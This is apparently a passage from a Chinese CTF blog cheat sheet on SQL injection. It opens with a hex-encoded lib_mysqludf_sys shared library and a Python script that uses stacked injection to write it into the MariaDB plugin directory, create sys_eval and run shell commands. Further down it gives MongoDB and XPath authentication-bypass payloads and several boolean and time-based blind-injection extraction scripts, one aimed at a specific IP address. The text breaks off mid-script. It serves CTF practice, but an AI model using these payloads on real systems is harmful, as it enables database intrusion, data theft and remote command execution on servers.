8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#x27;</span></span><br><span class="line">codes=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(code),<span class="number">128</span>):</span><br><span class="line">	codes.append(code[i:<span class="built_in">min</span>(i+<span class="number">128</span>,<span class="built_in">len</span>(code))])</span><br><span class="line"></span><br><span class="line"><span class="comment">#建临时表</span></span><br><span class="line"><span class="comment">#sql=&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)</span></span><br><span class="line"><span class="comment">#requests.get(url+payload)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#清空临时表</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#插入第一段数据</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[<span class="number">0</span>])</span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#更新连接剩余数据</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(codes)):</span><br><span class="line">	sql=<span class="string">&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[k])</span><br><span class="line">	payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">	requests.get(url+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#10.3.18-MariaDB	</span></span><br><span class="line"><span class="comment">#写入so文件</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so\&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#引入自定义函数</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;udf.so\&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#命令执行，结果更新到界面</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;cat /flag.her?&#x27;))&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(sql)</span><br><span class="line">requests.get(url+payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看结果</span></span><br><span class="line">r=requests.get(url[:-<span class="number">4</span>]+<span class="string">&#x27;?page=1&amp;limit=10&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>​</p><h3 id="SQLite3"><a href="#SQLite3" class="headerlink" title="SQLite3"></a>SQLite3</h3><p>内置表：</p><p><code>select name,sql from sqlite_master</code></p><p><code>select group_concat(sql) from sqlite_master</code></p><p>​</p><h3 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h3><h4 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h4><p>万能密码：<code>&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</code></p><p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">MongoDB 注入指北</a></p><p><a target="_blank" rel="noopener" href="https://www.mongodb.com/docs/manual/">MongoDB Documentation</a></p><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9908">Nosql 注入从零到一</a></p><p>​</p><h3 id="XPath"><a href="#XPath" class="headerlink" title="XPath"></a>XPath</h3><p>XPath 即为 XML 路径语言，是 W3C XSLT 标准的主要元素，它是一种用来确定 XML（标准通用标记语言的子集）文档中某部分位置的语言。</p><p>Xpath查询语句：</p><p><code>$query=&quot;user/username[@name=&#39;&quot;.$user.&quot;&#39;]&quot;;</code></p><ul><li>注入点：URL、表单或其它信息上附带恶意的 XPath 查询代码</li><li>注入漏洞验证：输入<code>id=1&#39;</code>、<code>`id=-1</code>看页面是否返回报错信息</li><li>注入万能公式：<code>id=1&#39; or 1=1 or &#39;&#39;=&#39;</code></li><li>万能访问xml文档所有节点的payload: <code>&#39;]|//*|//*[&#39;</code></li></ul><p>​</p><h3 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h3><ul><li><h4 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic=<span class="string">&#x27;&#123;&#125;-_&#x27;</span>+string.digits+string.ascii_lowercase</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;xxxxxxx&#x27;</span></span><br><span class="line">now=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	flag=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">		payload=<span class="string">&#x27;&#x27;&#x27;xxxxxxx&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>()</span><br><span class="line">		<span class="comment">#print(payload)</span></span><br><span class="line">		data=&#123;<span class="string">&#x27;username&#x27;</span>:payload,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;xxxxx&#x27;</span>&#125;</span><br><span class="line">		r=requests.post(url,data=data)</span><br><span class="line">		<span class="comment">#print(r.text)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;xxx&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			now+=j</span><br><span class="line">			<span class="built_in">print</span>(now)</span><br><span class="line">			flag=<span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;xxx&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select(database())),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(flag4s))from(ctfshow.flags)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: <span class="string">f&quot;100&#x27;)||<span class="subst">&#123;payload&#125;</span>||(&#x27;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url,params=data)</span><br><span class="line">        <span class="comment"># r = requests.post(url,data=data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;xxx&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mysql8新特性</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bind_sql</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    dic = <span class="string">&quot;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/-,+*)(&amp;%$#!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        f = flag</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            _ = flag + j</span><br><span class="line">            <span class="comment">#payload = &quot;0||(binary&#x27;&#123;&#125;&#x27;,&#x27;&#x27;,3,4)&lt;(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/0,1)&quot;.format(_)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0||(&#x27;cnss&#x27;,binary&#x27;&#123;&#125;&#x27;,3,4)&lt;(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1,1)&quot;.format(_)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0||(&#x27;2&#x27;,&#x27;lisi&#x27;,binary&#x27;&#123;&#125;&#x27;)&lt;(table/**/users/**/limit/**/1,1)&quot;.format(_)</span></span><br><span class="line">            payload = <span class="string">&quot;0||(&#x27;8&#x27;,binary&#x27;&#123;&#125;&#x27;)&lt;(table/**/cn55/**/limit/**/7,1)&quot;</span>.<span class="built_in">format</span>(_)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: payload</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.get(url=url, params=data)</span><br><span class="line">            <span class="comment"># r = requests.post(url, data=data)</span></span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;xxx&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                    flag = flag[:-<span class="number">1</span>] + <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    exit()</span><br><span class="line">                flag += j</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == f:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># input url</span></span><br><span class="line">    url = <span class="string">&#x27;http://124.221.34.13:55553/&#x27;</span></span><br><span class="line">    result = bind_sql()</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li></ul><ul><li><h4 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dic=<span class="string">&#x27;&#123;&#125;-_,&#x27;</span>+string.ascii_lowercase+string.digits</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;xxxxxx&#x27;</span></span><br><span class="line">now=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	flag=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">		a=time.time()</span><br><span class="line">		payload=<span class="string">&#x27;&#x27;&#x27;xxxxxx&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>()</span><br><span class="line">		data=&#123;<span class="string">&#x27;ip&#x27;</span>:payload,<span class="string">&quot;debug&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">		r=requests.post(url,data=data)</span><br><span class="line">		b=time.time()</span><br><span class="line">		<span class="keyword">if</span> b-a&gt;<span class="number">1</span>:</span><br><span class="line">			now+=j</span><br><span class="line">			flag=<span class="number">1</span></span><br><span class="line">			<span class="built_in">print</span>(now)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xxx/?id=1%22and%20&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span 